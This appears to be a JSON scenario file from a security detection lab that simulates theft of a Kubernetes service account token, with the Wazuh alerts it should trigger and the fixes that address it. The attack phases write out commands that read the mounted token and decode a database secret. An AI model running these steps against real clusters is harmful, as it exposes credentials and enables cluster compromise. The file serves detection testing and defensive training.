{
  "id": "S4-02",
  "name": "Kubernetes Service Account Token Theft",
  "category": "Kubernetes",
  "version": "1.0",
  "description": "Steal Kubernetes service account tokens to access cluster API",
  "difficulty": "Easy",
  "real_world_relevance": "Default SA token exposure, cluster compromise via pod",

  "mitre_attack": {
    "tactics": ["Credential Access", "Discovery"],
    "techniques": [
      {"id": "T1528", "name": "Steal Application Access Token"},
      {"id": "T1613", "name": "Container and Resource Discovery"}
    ]
  },

  "prerequisites": {
    "containers": ["k8s-node"],
    "network": "k8s_net"
  },

  "attack_flow": {
    "description": "Attacker extracts service account token from pod to access Kubernetes API",
    "diagram": [
      "1. Attacker gains access to pod (RCE, compromised image)",
      "2. Attacker reads service account token from /var/run/secrets/",
      "3. Attacker discovers Kubernetes API server endpoint",
      "4. Attacker uses token to query Kubernetes API",
      "5. Attacker enumerates secrets, configmaps, and other resources"
    ]
  },

  "phases": [
    {
      "name": "Token Discovery",
      "description": "Locate mounted service account token",
      "actions": [
        {
          "type": "command",
          "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
          "expected_output_contains": ["eyJ"]
        },
        {
          "type": "command",
          "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
          "expected_output_contains": ["default"]
        }
      ]
    },
    {
      "name": "API Server Discovery",
      "description": "Find Kubernetes API server endpoint",
      "actions": [
        {
          "type": "command",
          "command": "env | grep KUBERNETES",
          "expected_output_contains": ["KUBERNETES_SERVICE_HOST", "KUBERNETES_SERVICE_PORT"]
        }
      ]
    },
    {
      "name": "Permission Enumeration",
      "description": "Check what the service account can access",
      "actions": [
        {
          "type": "command",
          "command": "kubectl auth can-i --list",
          "expected_output_contains": ["get", "list", "watch"]
        }
      ]
    },
    {
      "name": "Secret Enumeration",
      "description": "List and access secrets in the namespace",
      "critical": true,
      "actions": [
        {
          "type": "command",
          "command": "kubectl get secrets -n default",
          "description": "List secrets in current namespace"
        },
        {
          "type": "command",
          "command": "kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d",
          "description": "Extract secret value"
        }
      ]
    }
  ],

  "indicators_of_compromise": [
    {
      "type": "File Access",
      "description": "Read access to service account token file",
      "wazuh_rule": "100753"
    },
    {
      "type": "Network",
      "description": "Direct API calls to Kubernetes API server from pod",
      "wazuh_rule": "100754"
    },
    {
      "type": "Process",
      "description": "kubectl commands executed from within pod",
      "wazuh_rule": "100755"
    }
  ],

  "expected_wazuh_alerts": [
    {
      "rule_id": "100753",
      "level": 8,
      "description": "NHI: Kubernetes service account token accessed"
    },
    {
      "rule_id": "100754",
      "level": 10,
      "description": "NHI: Kubernetes API access from pod"
    },
    {
      "rule_id": "100755",
      "level": 12,
      "description": "NHI: kubectl execution in container - potential attack"
    }
  ],

  "remediation": {
    "immediate": [
      "Rotate service account token",
      "Review API audit logs for unauthorized access",
      "Terminate and replace compromised pod"
    ],
    "long_term": [
      "Disable automatic SA token mounting",
      "Use bound service account tokens (Kubernetes 1.22+)",
      "Implement RBAC with least privilege",
      "Use Pod Security Standards"
    ],
    "pod_spec": {
      "comment": "Disable automatic SA token mounting",
      "apiVersion": "v1",
      "kind": "Pod",
      "spec": {
        "automountServiceAccountToken": false,
        "containers": [{"name": "app"}]
      }
    },
    "rbac_example": {
      "apiVersion": "rbac.authorization.k8s.io/v1",
      "kind": "Role",
      "metadata": {"name": "minimal-role"},
      "rules": [
        {
          "apiGroups": [""],
          "resources": ["configmaps"],
          "verbs": ["get"],
          "resourceNames": ["app-config"]
        }
      ]
    }
  },

  "demo_script": {
    "container": "k8s-node",
    "commands": [
      "# Read service account token",
      "cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50",
      "",
      "# Find API server",
      "echo \"API Server: $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT\"",
      "",
      "# Check permissions",
      "kubectl auth can-i --list 2>/dev/null || echo 'kubectl not available'"
    ]
  },

  "references": [
    {
      "title": "Kubernetes Service Accounts",
      "url": "https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/"
    },
    {
      "title": "Bound Service Account Tokens",
      "url": "https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/"
    },
    {
      "title": "MITRE ATT&CK T1528",
      "url": "https://attack.mitre.org/techniques/T1528/"
    }
  ]
}
